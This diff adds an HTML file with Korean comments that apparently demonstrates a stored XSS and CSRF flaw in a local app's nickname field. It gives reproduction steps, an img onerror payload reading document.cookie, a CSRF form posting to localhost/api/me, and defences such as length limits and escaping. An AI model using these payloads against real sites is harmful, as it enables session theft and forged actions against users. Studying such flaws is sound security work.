@@ -1,0 +1,27 @@
+<!-- 
+재현 방법
+1. nickname max length 넉넉하게 설정
+2. escape 처리를 하지 않음
+3. <img src='#' onerror=alert(`${document.cookie}`); /> 으로 닉변 (<form action="https://localhost:443/api/me/" method="post"><button>공격 실행</button><input type="hidden" name="user_id" value="145128"></form> 도 가능)
+-->
+
+<!-- 
+방어 방법
+1. name의 크기를 12바이트로 제한
+2. 디비에 저장 시 이스케이프 처리
+-->
+
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <form action="https://localhost/api/me/" method="post"><button>클릭해봐잉</button></form>
+</body>
+</html>
+
+<!-- https://localhost/api/me?name=seunan -->
+<!-- <img src='#' onerror=alert(`${document.cookie}`); /> -->
